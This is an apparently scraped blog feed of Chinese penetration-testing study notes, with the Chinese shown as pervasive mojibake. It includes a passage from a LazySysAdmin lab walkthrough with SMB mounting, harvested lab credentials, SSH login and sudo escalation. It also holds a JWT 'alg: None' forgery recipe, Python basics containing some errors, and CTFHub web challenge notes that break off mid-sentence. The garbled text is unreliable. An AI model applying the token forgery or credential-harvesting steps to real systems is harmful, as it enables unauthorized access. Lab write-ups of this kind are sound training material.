//192.168.204.139/share$ /mntè¿™é‡Œ-tæ˜¯ä»¥ä»€ä¹ˆæ–‡ä»¶å¸¸è§æ–‡ä»¶ç±»å‹ï¼šmtfsï¼ˆfatï¼Œextï¼‰ï¼ˆéç½‘ç»œï¼ŒåŸºäºæœ¬åœ°ï¼Œç£ç›˜ç­‰ï¼‰è€Œcifsï¼ˆcommon internet file systemï¼‰//æŒ‚è½½äº’è”ç½‘ä¸Šçš„æ–‡ä»¶ï¼ˆåŸºäºç½‘ç»œï¼‰-o ï¼ˆé€‰é¡¹ï¼‰æƒ³è¦è®¿é—®ä¸€ä¸ªå…±äº«ç›®å½•ï¼Œå°±è¦æŒ‡å®šè¯¥è®¿é—®ç”¨æˆ·unameå’Œupasswdä»¥åŠæ‰€åœ¨ç½‘ç»œçš„IPï¼Œè€Œshare$æ˜¯æŒ‡è®¿é—®è¿™ä¸ªç›®å½•/mntå°†share$çš„ç›®å½•æŒ‚è½½åˆ°æ”»å‡»æœºçš„è¯¥ç›®å½•ä¸‹</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52330_4.png" alt></p><p>æŒ‚è½½æˆåŠŸ</p><p>è§£é‡Šï¼š</p><p>CIFS (Common Internet FileSystem) é€šç”¨Internetæ–‡ä»¶ç³»ç»Ÿã€‚ä½¿ç”¨å®¢æˆ·/æœåŠ¡å™¨æ¨¡å¼ï¼ŒCIFSæ˜¯å…¬å…±çš„æˆ–å¼€æ”¾çš„SMBåè®®ç‰ˆæœ¬ï¼ŒCIFSé¢å‘ç½‘ç»œè¿æ¥çš„å…±äº«åè®®ï¼Œå¯¹ç½‘ç»œä¼ è¾“çš„å¯é æ€§è¦æ±‚é«˜ï¼Œå¸¸ä½¿ç”¨TCP/IPã€‚</p><pre><code>mount [options] &lt;source&gt; &lt;directory&gt;</code></pre><p><strong>-t</strong> vfstype æŒ‡å®šæ–‡ä»¶ç³»ç»Ÿçš„ç±»å‹ï¼ˆé€šå¸¸ä¸å¿…æŒ‡å®šã€‚mount ä¼šè‡ªåŠ¨é€‰æ‹©æ­£ç¡®çš„ç±»å‹ã€‚ï¼‰</p><p>å¸¸ç”¨ç±»å‹æœ‰ï¼š<br>å…‰ç›˜æˆ–å…‰ç›˜é•œåƒï¼š<strong>iso9660</strong><br>DOS fat16æ–‡ä»¶ç³»ç»Ÿï¼š<strong>msdos</strong><br>Windows 9x fat32æ–‡ä»¶ç³»ç»Ÿï¼š<strong>vfat</strong><br>Windows NT ntfsæ–‡ä»¶ç³»ç»Ÿï¼š<strong>ntfs</strong><br>Mount Windowsæ–‡ä»¶ç½‘ç»œå…±äº«ï¼š<strong>smbfs</strong><br>UNIX(LINUX) æ–‡ä»¶ç½‘ç»œå…±äº«ï¼š<strong>nfs</strong></p><p><strong>-o</strong> options ä¸»è¦ç”¨æ¥æè¿°è®¾å¤‡æˆ–æ¡£æ¡ˆçš„æŒ‚æ¥æ–¹å¼ã€‚å¸¸ç”¨çš„å‚æ•°æœ‰ï¼š<br><strong>loop</strong>ï¼šç”¨æ¥æŠŠä¸€ä¸ªæ–‡ä»¶å½“æˆç¡¬ç›˜åˆ†åŒºæŒ‚æ¥ä¸Šç³»ç»Ÿ<br><strong>ro</strong>ï¼šé‡‡ç”¨åªè¯»æ–¹å¼æŒ‚æ¥è®¾å¤‡<br><strong>rw</strong>ï¼šé‡‡ç”¨è¯»å†™æ–¹å¼æŒ‚æ¥è®¾å¤‡<br><strong>iocharset</strong>ï¼šæŒ‡å®šè®¿é—®æ–‡ä»¶ç³»ç»Ÿæ‰€ç”¨å­—ç¬¦é›†<br><strong>device</strong> è¦æŒ‚æ¥(mount)çš„è®¾å¤‡ã€‚<br><strong>dir</strong>è®¾å¤‡åœ¨ç³»ç»Ÿä¸Šçš„æŒ‚æ¥ç‚¹(mount point)ã€‚</p><h3 id="5-æ–‡ä»¶åˆ†æ-sshç™»å½•"><a href="#5-æ–‡ä»¶åˆ†æ-sshç™»å½•" class="headerlink" title="5.æ–‡ä»¶åˆ†æ-sshç™»å½•"></a>5.æ–‡ä»¶åˆ†æ-sshç™»å½•</h3><p>è¿™é‡ŒæŸ¥æ‰¾deetstxtæ–‡ä»¶å‘ç°ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52335_5.png" alt></p><p>å¾—åˆ°ä¸€ä¸ªå¯†ç 12345</p><p>æ ¹æ®ä¸Šé¢çš„wordpressæ–‡ä»¶å‘ç°togieæ–‡ä»¶å‘ç°çš„ç”¨æˆ·å</p><p>æ‰€ä»¥å¯ä»¥å°è¯•sshè¿æ¥togieç”¨æˆ·</p><pre><code>ssh togie@192.168.204.139</code></pre><p>ç„¶åå‘ç°ç™»é™†æˆåŠŸï¼</p><p>è·å–shellï¼</p><h3 id="6-æ–‡ä»¶åˆ†æ-phpmyadminç™»å½•"><a href="#6-æ–‡ä»¶åˆ†æ-phpmyadminç™»å½•" class="headerlink" title="6.æ–‡ä»¶åˆ†æ-phpmyadminç™»å½•"></a>6.æ–‡ä»¶åˆ†æ-phpmyadminç™»å½•</h3><p>### </p><pre><code>root@kali1:~# cd /mntroot@kali1:/mnt# cd wordpress/root@kali1:/mnt/wordpress# lsindex.php        wp-blog-header.php    wp-cron.php        wp-mail.phplicense.txt      wp-comments-post.php  wp-includes        wp-settings.phpreadme.html      wp-config.php         wp-links-opml.php  wp-signup.phpwp-activate.php  wp-config-sample.php  wp-load.php        wp-trackback.phpwp-admin         wp-content            wp-login.php       xmlrpc.phproot@kali1:/mnt/wordpress# vim wp-cwp-comments-post.php  wp-config-sample.php  wp-cron.phpwp-config.php         wp-content/           root@kali1:/mnt/wordpress# vim wp-config.php</code></pre><p>å‘ç°ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52348_6.png" alt></p><p>æ•°æ®åº“çš„ç™»é™†åå­—</p><p>Admin</p><p>å’Œå¯†ç </p><p>TogieMYSQL12345^^</p><p>ç„¶åè¿›å…¥/phpmyadminåˆ©ç”¨ä¸Šè¿°ä¿¡æ¯è¿›è¡Œç™»é™†</p><p>ä½†æ˜¯å´å¯¹æƒé™è¿›è¡Œäº†é™åˆ¶ï¼å•¥ä¹Ÿä¸å¥½ä½¿ã€‚ã€‚</p><h3 id="7-ç»ˆæç›®æ ‡ï¼šç³»ç»Ÿææƒ"><a href="#7-ç»ˆæç›®æ ‡ï¼šç³»ç»Ÿææƒ" class="headerlink" title="7.ç»ˆæç›®æ ‡ï¼šç³»ç»Ÿææƒ"></a>7.ç»ˆæç›®æ ‡ï¼šç³»ç»Ÿææƒ</h3><pre><code>togie@LazySysAdmin:~$ sudo su[sudo] password for togie: root@LazySysAdmin:/home/togie# whoamiroot</code></pre><h3 id="8-æœ€åæ¨ä¸€ä¸‹ä¸€ä¸ªå¤§ä½¬çš„æ‰«é™¤æ—¶åˆ»ï¼šï¼ˆæ­¤å¤„å¹¶æœªå®æ“ï¼‰"><a href="#8-æœ€åæ¨ä¸€ä¸‹ä¸€ä¸ªå¤§ä½¬çš„æ‰«é™¤æ—¶åˆ»ï¼šï¼ˆæ­¤å¤„å¹¶æœªå®æ“ï¼‰" class="headerlink" title="8.æœ€åæ¨ä¸€ä¸‹ä¸€ä¸ªå¤§ä½¬çš„æ‰«é™¤æ—¶åˆ»ï¼šï¼ˆæ­¤å¤„å¹¶æœªå®æ“ï¼‰"></a>8.æœ€åæ¨ä¸€ä¸‹ä¸€ä¸ªå¤§ä½¬çš„æ‰«é™¤æ—¶åˆ»ï¼šï¼ˆæ­¤å¤„å¹¶æœªå®æ“ï¼‰</h3><p>URL=<a href="https://blog.csdn.net/qq_38684504/article/details/89703963" target="_blank" rel="noopener">https://blog.csdn.net/qq_38684504/article/details/89703963</a></p><p>ç„¶åæ ¹æ®å¤§ä½¬çš„wpå®‰æ’è‡ªå·±ä¸€ä¸ªç«ç‹æ’ä»¶</p><p>wappalyzer</p><p>å¤–åŠ å¦ä¸€ä¸ªå¾ˆå—¨çš„wpï¼š</p><p><a href="https://blog.csdn.net/weixin_45557138/article/details/108548437" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45557138/article/details/108548437</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¥é—¨ </tag>
            
            <tag> é¶æœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWTéªŒè¯</title>
      <link href="/2020/12/26/jsonweb-token-yan-zheng/"/>
      <url>/2020/12/26/jsonweb-token-yan-zheng/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Json web token (JWT), æ˜¯ä¸ºäº†åœ¨ç½‘ç»œåº”ç”¨ç¯å¢ƒé—´ä¼ é€’å£°æ˜è€Œæ‰§è¡Œçš„ä¸€ç§åŸºäºJSONçš„å¼€æ”¾æ ‡å‡†ï¼ˆ(RFC 7519).è¯¥tokenè¢«è®¾è®¡ä¸ºç´§å‡‘ä¸”å®‰å…¨çš„ï¼Œç‰¹åˆ«é€‚ç”¨äºåˆ†å¸ƒå¼ç«™ç‚¹çš„å•ç‚¹ç™»å½•ï¼ˆSSOï¼‰åœºæ™¯ã€‚JWTçš„å£°æ˜ä¸€èˆ¬è¢«ç”¨æ¥åœ¨èº«ä»½æä¾›è€…å’ŒæœåŠ¡æä¾›è€…é—´ä¼ é€’è¢«è®¤è¯çš„ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼Œä»¥ä¾¿äºä»èµ„æºæœåŠ¡å™¨è·å–èµ„æºï¼Œä¹Ÿå¯ä»¥å¢åŠ ä¸€äº›é¢å¤–çš„å…¶å®ƒä¸šåŠ¡é€»è¾‘æ‰€å¿…é¡»çš„å£°æ˜ä¿¡æ¯ï¼Œè¯¥tokenä¹Ÿå¯ç›´æ¥è¢«ç”¨äºè®¤è¯ï¼Œä¹Ÿå¯è¢«åŠ å¯†ã€‚</p><p>æœ¬èŠ‚è¯¾ä¸­è¯¦ç»†ä»‹ç»äº†JSON Web Tokenï¼ˆJWTï¼‰ä¸­çš„æ¼æ´çš„åˆ©ç”¨ã€‚åœ¨è¿™ä¸ªç¨‹åºä¸­ï¼ŒJWTç”¨äºè®¤è¯ï¼Œç™»å½•æˆåŠŸåï¼Œç”¨æˆ·å°†è·å¾—ä¸€ä¸ªCookieçš„JWTã€‚</p><p>JSON Web Tokenæ˜¯ä¸€ç§æ•°æ®çš„å­˜å‚¨æœºåˆ¶ï¼Œä¸»è¦æœ‰åŠ å¯†å’Œç­¾åçš„å®‰å…¨æœºåˆ¶ã€‚</p><p>JWTçš„æ ¼å¼å¦‚ä¸‹ï¼š</p><p>Base64(header).Base64(payload).Base64(signature)</p><p>ä¾‹å¦‚ï¼š</p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6ImFhYWEiLCJpYXQiOiIxNTI1MzQyMDM3In0</p><p>è¡¨ç¤º</p><p>{â€œalgâ€:â€HS256â€,â€typâ€:â€JWSâ€}. {â€œloginâ€:â€aaaaâ€,â€iatâ€:â€1525342037â€}.ç½‘ç«™å¯¹æ•°æ®è®¾è®¡ç­¾åæœºåˆ¶</p><p>ç¬¬ä¸‰éƒ¨åˆ†æ˜¯ä¸€ä¸ªç­¾åï¼Œç½‘ä¸Šè¯´çš„å¾ˆè¯¦ç»†äº†ï¼Œæ­¤å¤„ä¸è¿›è¡Œè¯´æ˜ã€‚</p><p>å…·ä½“æ“ä½œå°±æ˜¯ï¼š</p><p>ç„¶åå°†ç¼–ç æ ¼å¼HS256æ”¹ä¸ºNoneï¼Œå°†ç”¨æˆ·åæ”¹ä¸ºadminï¼Œç„¶ååˆ†åˆ«è¿›è¡ŒBase64ç¼–ç ï¼Œå¹¶æŠŠç¬¬ä¸‰éƒ¨åˆ†å»æ‰ï¼ˆæ³¨æ„ä¸è¦å»æ‰.ï¼‰</p><p>{â€œalgâ€:â€Noneâ€,â€typâ€:â€JWSâ€}. {â€œloginâ€:â€adminâ€,â€iatâ€:â€1525342037â€}.</p><p>ç„¶ååˆ†åˆ«å¯¹{â€œalgâ€:â€Noneâ€,â€typâ€:â€JWSâ€}</p><p>{â€œloginâ€:â€adminâ€,â€iatâ€:â€1525342037â€}</p><p>è¿›è¡Œbase64åŠ å¯†ï¼Œç„¶åå°†bpæŠ“åˆ°çš„tokenå€¼æ›¿æ¢ä¸ºåˆšæ‰åŠ å¯†çš„å€¼</p><p>okï¼Œå·²ç»å˜æˆadminç”¨æˆ·ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¥é—¨ </tag>
            
            <tag> json web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonå­¦ä¹ </title>
      <link href="/2020/12/24/python-da-xue-xi/"/>
      <url>/2020/12/24/python-da-xue-xi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PythonåŸºç¡€è¿ç®—"><a href="#PythonåŸºç¡€è¿ç®—" class="headerlink" title="PythonåŸºç¡€è¿ç®—"></a>PythonåŸºç¡€è¿ç®—</h1><p>1.æ­¤å¤„æƒ³è¦è¾“å‡ºæ±‰å­—éœ€è¦åœ¨ä¸€å¼€å§‹åŠ ä¸€ä¸ªç¼–ç ï¼š#coding=utf-8</p><p>2.pythonæœ€å…·æœ‰ç‰¹è‰²çš„å°±æ˜¯ç”¨ç¼©è¿›æ¥å†™æ¨¡å—</p><p>3.â€â€â€xxxâ€â€â€è¿™é‡Œå¯ä»¥å¤šè¡Œprint</p><p>4.é€šè¿‡#æ³¨é‡Š</p><p>5.</p><pre><code>counter = 100#èµ‹å€¼æ•´æ•°å‹å˜é‡miles = 1000.0#èµ‹å€¼æµ®ç‚¹å‹å˜é‡name = &quot;iceberg404&quot;#èµ‹å€¼å­—ç¬¦ä¸²</code></pre><p>6.pythonäº”ä¸ªæ ‡å‡†çš„æ•°æ®ç±»å‹ï¼šnumbersï¼ˆæ•°å­—ï¼‰ã€stringï¼ˆå­—ç¬¦ä¸²ï¼‰ã€listï¼ˆåˆ—è¡¨ï¼‰ã€tupleï¼ˆå…ƒç»„ï¼‰ã€dictionaryï¼ˆå­—å…¸ï¼‰</p><p>7.</p><pre><code>int æœ‰ç¬¦å·æ•´æ•°å‹long é•¿æ•´æ•°ï¼ˆä¹Ÿå¯ä»¥ä»£è¡¨å…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶ï¼‰float æµ®ç‚¹æ•°complex å¤æ•°intï¼ˆxï¼Œ[,base]ï¼‰å°†xè½¬æ¢ä¸ºä¸€ä¸ªæ•´æ•°longï¼ˆxï¼Œ[,base]ï¼‰å°†xè½¬æ¢ä¸ºä¸€ä¸ªé•¿æ•´æ•°floatï¼ˆxï¼Œ[,base]ï¼‰å°†xè½¬æ¢ä¸ºä¸€ä¸ªæµ®ç‚¹æ•°floatï¼ˆxï¼‰ å°†xè½¬æ¢åˆ°ä¸€ä¸ªæµ®ç‚¹æ•°strï¼ˆxï¼‰ å°†å¯¹è±¡xè½¬æ¢ä¸ºå­—ç¬¦ä¸²tupleï¼ˆsï¼‰ å°†åºåˆ—sè½¬æ¢ä¸ºå…ƒç»„listï¼ˆsï¼‰ å°†åºåˆ—sè½¬æ¢ä¸ºä¸€ä¸ªåˆ—è¡¨absï¼ˆ-10ï¼‰ç»“æœä¸º10#è¿”å›æ•°å­—çš„ç»å¯¹å€¼maxï¼ˆx1ï¼Œx2ï¼Œx3ï¼‰#è¿”å›ç»™å®šå‚æ•°çš„æœ€å¤§å€¼ï¼Œå‚æ•°å¯ä»¥ä¸ºåºåˆ—sqrtï¼ˆxï¼‰#è¿”å›æ•°å­—xçš„å¹³æ–¹ä¾‹ï¼šimport cmatha=9999999print absï¼ˆaï¼‰print max ï¼ˆ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5ï¼‰b=8print cmath.sqrtï¼ˆbï¼‰è¿”å›ç»“æœï¼š99999995ï¼ˆ2.82842712475+0jï¼‰&quot;&quot;&quot;å½“æˆ‘ä»¬åœ¨æ—¥å¸¸ç”Ÿæ´»ä¸­ç¼–å†™ç¨‹åºæ—¶ï¼Œæˆ‘ä»¬é€šå¸¸é‡åˆ°éœ€è¦ä½¿ç”¨æ•°å­¦æ¥å®Œæˆä»»åŠ¡çš„æƒ…å†µã€‚åƒå…¶ä»–ç¼–ç¨‹è¯­è¨€ä¸€æ ·ï¼ŒPythonæä¾›äº†å„ç§åŸºæœ¬è¿ç®—æ“ä½œï¼Œå¦‚*ä»£è¡¨ä¹˜æ³•ï¼Œ%ä»£è¡¨æ±‚æ¨¡è¿ç®—ï¼Œ//ä»£è¡¨æ•´é™¤ã€‚å¦‚æœæ‚¨æ­£åœ¨ç¼–å†™ä¸€ä¸ªç¨‹åºæ¥æ‰§è¡Œç‰¹å®šä»»åŠ¡ï¼Œå¦‚ç ”ç©¶å‘¨æœŸè¿åŠ¨æˆ–æ¨¡æ‹Ÿç”µè·¯ï¼Œæ‚¨å°†éœ€è¦ä½¿ç”¨ä¸‰è§’å‡½æ•°ä»¥åŠå¤æ•°ã€‚è™½ç„¶æ‚¨ä¸èƒ½ç›´æ¥ä½¿ç”¨è¿™äº›åŠŸèƒ½ï¼Œä½†æ‚¨å¯ä»¥å…ˆå¯¼å…¥ä¸¤ä¸ªæ•°å­¦æ¨¡å—æ¥è®¿é—®å®ƒä»¬ã€‚è¿™ä¸¤ä¸ªæ¨¡å—æ˜¯mathå’Œcmathã€‚ç¬¬ä¸€ä¸ªæ¨¡å—å…è®¸æ‚¨è®¿é—®å®æ•°çš„åŒæ›²çº¿ï¼Œä¸‰è§’å‡½æ•°å’Œå¯¹æ•°å‡½æ•°ï¼Œè€Œåè€…å…è®¸æ‚¨ä½¿ç”¨å¤æ•°ã€‚&quot;&quot;&quot;</code></pre><p>c+=aç­‰æ•ˆäºc=c+a</p><pre><code>a=20.00b=20ifï¼ˆa is bï¼‰  print &quot;a is b&quot;else (a == b)  print &quot;a==b&quot;è¾“å‡ºç»“æœä¸ºa==bè¿™æ˜¯iså’Œ==ä¹‹é—´çš„åŒºåˆ«ï¼Œæ­¤å¤„ç”±äºaæ˜¯æµ®ç‚¹æ•°ï¼Œæ‰€ä»¥aä¸ç­‰äºæ•´æ•°bï¼Œæ•…aä¸æ˜¯æ˜¯bï¼Œä½†æ˜¯a=bã€‚</code></pre><pre><code>flag = Falsename = &#39;ice&#39;if name == &#39;py&#39;:  flag = True  print &#39;1&#39;else:  print name</code></pre><pre><code>count = 0while(count &lt; 5):  print count,&quot;is less than 5&quot;  count += 1else:  print count,&quot;is not less than 5&quot;print &quot;over&quot;</code></pre><h1 id="Pythonæ­£åˆ™ï¼š"><a href="#Pythonæ­£åˆ™ï¼š" class="headerlink" title="Pythonæ­£åˆ™ï¼š"></a>Pythonæ­£åˆ™ï¼š</h1><p>æ­£åˆ™è¡¨è¾¾å¼ Regular Expression, æ­£åˆ™è¡¨è¾¾å¼, â¼€ç§ä½¿â½¤è¡¨è¾¾å¼çš„â½…å¼å¯¹å­—ç¬¦ä¸² è¿›â¾åŒ¹é…çš„è¯­æ³•è§„åˆ™. æˆ‘ä»¬æŠ“å–åˆ°çš„â½¹â»šæºä»£ç æœ¬è´¨ä¸Šå°±æ˜¯â¼€ä¸ªè¶…â»“çš„å­—ç¬¦ä¸², æƒ³ä»â¾¥â¾¯æ å–å†…å®¹.â½¤æ­£åˆ™å†åˆé€‚ä¸è¿‡äº†. æ­£åˆ™çš„ä¼˜ç‚¹: é€Ÿåº¦å¿«, æ•ˆç‡â¾¼, å‡†ç¡®æ€§â¾¼ æ­£åˆ™çš„ç¼ºç‚¹: æ–°â¼¿ä¸Šâ¼¿éš¾åº¦æœ‰ ç‚¹â¼‰â¾¼. ä¸è¿‡åªè¦æŒæ¡äº†æ­£åˆ™ç¼–å†™çš„é€»è¾‘å…³ç³», å†™å‡ºâ¼€ä¸ªæå–â»šâ¾¯å†…å®¹çš„æ­£åˆ™ å…¶å®å¹¶ä¸å¤æ‚ æ­£åˆ™çš„è¯­æ³•: ä½¿â½¤å…ƒå­—ç¬¦è¿›â¾æ’åˆ—ç»„åˆâ½¤æ¥åŒ¹é…å­—ç¬¦ä¸² åœ¨çº¿æµ‹è¯•æ­£ åˆ™è¡¨è¾¾å¼<a href="https://tool.oschina.net/regex/" target="_blank" rel="noopener">https://tool.oschina.net/regex/</a> </p><p>å…ƒå­—ç¬¦ï¼ˆé»˜è®¤åªåŒ¹é…ä¸€æ¬¡ï¼‰: å…·æœ‰å›ºå®šå«ä¹‰çš„ç‰¹æ®Šç¬¦å· å¸¸â½¤å…ƒå­—ç¬¦:</p><pre><code>. åŒ¹é…é™¤æ¢â¾ç¬¦ä»¥å¤–çš„ä»»æ„å­—ç¬¦\w åŒ¹é…å­—âºŸæˆ–æ•°å­—æˆ–ä¸‹åˆ’çº¿\s åŒ¹é…ä»»æ„çš„ç©ºâ½©ç¬¦\d åŒ¹é…æ•°å­—\n åŒ¹é…â¼€ä¸ªæ¢â¾ç¬¦\t åŒ¹é…â¼€ä¸ªåˆ¶è¡¨ç¬¦^ åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹$ åŒ¹é…å­—ç¬¦ä¸²çš„ç»“å°¾\W åŒ¹é…â¾®å­—âºŸæˆ–æ•°å­—æˆ–ä¸‹åˆ’çº¿\D åŒ¹é…â¾®æ•°å­—\S åŒ¹é…â¾®ç©ºâ½©ç¬¦a|b åŒ¹é…å­—ç¬¦aæˆ–å­—ç¬¦b () åŒ¹é…æ‹¬å·å†…çš„è¡¨è¾¾å¼ï¼Œä¹Ÿè¡¨ç¤ºâ¼€ä¸ªç»„[...] åŒ¹é…å­—ç¬¦ç»„ä¸­çš„å­—ç¬¦ [^...] åŒ¹é…é™¤äº†å­—ç¬¦ç»„ä¸­å­—ç¬¦çš„æ‰€æœ‰å­—ç¬¦</code></pre><p>é‡è¯: æ§åˆ¶å‰â¾¯çš„å…ƒå­—ç¬¦å‡ºç°çš„æ¬¡æ•°</p><pre><code>* é‡å¤é›¶æ¬¡æˆ–æ›´å¤šæ¬¡+ é‡å¤â¼€æ¬¡æˆ–æ›´å¤šæ¬¡? é‡å¤é›¶æ¬¡æˆ–â¼€æ¬¡{n} é‡å¤næ¬¡ {n,} é‡å¤næ¬¡æˆ–æ›´å¤šæ¬¡{n,m} é‡å¤nåˆ°mæ¬¡ .* è´ªå©ªåŒ¹é….*? æƒ°æ€§åŒ¹é…</code></pre><h1 id="Pythonæ¡†æ¶ä¹‹Flask"><a href="#Pythonæ¡†æ¶ä¹‹Flask" class="headerlink" title="Pythonæ¡†æ¶ä¹‹Flask"></a>Pythonæ¡†æ¶ä¹‹Flask</h1><p>ä¸€æ™šä¸Šå¹²ä¼šflask!</p><p>webæ¡†æ¶-&gt;å¯ä»¥åšç½‘ç«™</p><h1 id="Pythonå‡½æ•°"><a href="#Pythonå‡½æ•°" class="headerlink" title="Pythonå‡½æ•°"></a>Pythonå‡½æ•°</h1><h2 id="pythonä¸­rbæ˜¯ä»€ä¹ˆæ„æ€-pythonä¸­rbå«ä¹‰ç†è§£"><a href="#pythonä¸­rbæ˜¯ä»€ä¹ˆæ„æ€-pythonä¸­rbå«ä¹‰ç†è§£" class="headerlink" title="pythonä¸­rbæ˜¯ä»€ä¹ˆæ„æ€_pythonä¸­rbå«ä¹‰ç†è§£"></a>pythonä¸­rbæ˜¯ä»€ä¹ˆæ„æ€_pythonä¸­rbå«ä¹‰ç†è§£</h2><p>Pythonæ–‡ä»¶è¯»å†™çš„å‡ ç§æ¨¡å¼ï¼š</p><p>r,rb,w,wb é‚£ä¹ˆåœ¨è¯»å†™æ–‡ä»¶æ—¶ï¼Œæœ‰æ— bæ ‡è¯†çš„çš„ä¸»è¦åŒºåˆ«åœ¨å“ªé‡Œå‘¢ï¼Ÿ</p><p>æ–‡ä»¶ä½¿ç”¨æ–¹å¼æ ‡è¯†</p><p>â€˜râ€™:é»˜è®¤å€¼ï¼Œè¡¨ç¤ºä»æ–‡ä»¶è¯»å–æ•°æ®</p><p>â€˜wâ€™:è¡¨ç¤ºè¦å‘æ–‡ä»¶å†™å…¥æ•°æ®ï¼Œå¹¶æˆªæ–­ä»¥å‰çš„å†…å®¹</p><p>â€˜aâ€™:è¡¨ç¤ºè¦å‘æ–‡ä»¶å†™å…¥æ•°æ®ï¼Œæ·»åŠ åˆ°å½“å‰å†…å®¹å°¾éƒ¨</p><p>â€˜r+â€™:è¡¨ç¤ºå¯¹æ–‡ä»¶è¿›è¡Œå¯è¯»å†™æ“ä½œ(åˆ é™¤ä»¥å‰çš„æ‰€æœ‰æ•°æ®)</p><p>â€˜r+aâ€™ï¼šè¡¨ç¤ºå¯¹æ–‡ä»¶å¯è¿›è¡Œè¯»å†™æ“ä½œ(æ·»åŠ åˆ°å½“å‰æ–‡ä»¶å°¾éƒ¨)</p><p>â€˜bâ€™:è¡¨ç¤ºè¦è¯»å†™äºŒè¿›åˆ¶æ•°æ®ã€‚</p><p>è¯¦ç»†ä¿¡æ¯â†“ï¼š</p><p><a href="https://blog.csdn.net/weixin_42116847/article/details/112924747" target="_blank" rel="noopener">pythonä¸­rbæ˜¯ä»€ä¹ˆæ„æ€_pythonä¸­rbå«ä¹‰ç†è§£</a></p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¥é—¨ </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CtfHubå¤§å­¦ä¹ </title>
      <link href="/2020/12/23/ctfhub-xue-xi/"/>
      <url>/2020/12/23/ctfhub-xue-xi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1464325108&auto=1&height=66"></iframe><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Webå‰ç½®æŠ€èƒ½"><a href="#Webå‰ç½®æŠ€èƒ½" class="headerlink" title="Webå‰ç½®æŠ€èƒ½"></a>Webå‰ç½®æŠ€èƒ½</h2><h3 id="HTTPåè®®"><a href="#HTTPåè®®" class="headerlink" title="HTTPåè®®"></a>HTTPåè®®</h3><h4 id="è¯·æ±‚æ–¹å¼"><a href="#è¯·æ±‚æ–¹å¼" class="headerlink" title="è¯·æ±‚æ–¹å¼"></a>è¯·æ±‚æ–¹å¼</h4><pre><code>é¢˜ç›®ï¼šHTTP Method is GETUse CTF**B Method, I will give you flag.Hint: If you got ã€ŒHTTP Method Not Allowedã€ Error, you should request index.php.</code></pre><p>æ„æ€å°±æ˜¯ä½ æ˜¯getè¯·æ±‚ï¼Œä½ æŠŠè¿™ä¸ªè¯·æ±‚æ¢æˆCTFHUBå°±è¡Œ</p><p>æ‰€ä»¥æŠ“åŒ…ç›´æ¥ä¸€æŠŠæ¢­</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51640_1.png" alt></p><h4 id="302è·³è½¬"><a href="#302è·³è½¬" class="headerlink" title="302è·³è½¬"></a>302è·³è½¬</h4><p>é¢˜ç›®ï¼š</p><pre><code>No Flag here!Give me Flag</code></pre><p>ç‚¹å‡»å‘ç°æ²¡æœ‰è·³è½¬</p><p>äºŒè¯ä¸è¯´ï¼ŒæŠ“åŒ…ä¸€æŠŠæ¢­äº†</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51653_2.png" alt></p><p>è¿™é‡ŒçŠ¶æ€ç å˜ä¸ºäº†302è¯´æ˜è¿›è¡Œäº†é‡å®šå‘</p><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>ç›´æ¥æŠ“åŒ…ï¼Œæœ¬æ¥admin=0ï¼Œç„¶åç»™adminèµ‹å€¼=1å°±è¡Œäº†</p><h4 id="åŸºç¡€è®¤è¯"><a href="#åŸºç¡€è®¤è¯" class="headerlink" title="åŸºç¡€è®¤è¯"></a>åŸºç¡€è®¤è¯</h4><p>å¾—åˆ°æç¤º do u 